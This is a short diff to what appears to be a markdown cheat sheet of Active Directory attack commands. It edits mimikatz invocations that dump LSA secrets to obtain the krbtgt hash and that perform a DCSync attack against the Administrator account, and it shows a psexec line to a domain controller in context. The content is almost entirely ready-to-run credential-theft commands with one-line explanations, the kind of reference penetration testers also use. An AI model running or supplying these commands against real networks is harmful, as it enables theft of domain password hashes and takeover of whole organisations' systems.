@@ -285,7 +285,7 @@ kerberos::list
 
 -> get hash krbtgt
 ```
-mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
+./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
 ```
 -> get SID
 ```
@@ -306,5 +306,5 @@ psexec.exe \\dc1 cmd.exe
 #### DCSync Attack
 -> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
 ```
-mimikatz.exe lsadump::dcsync /user:Administrator
+./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
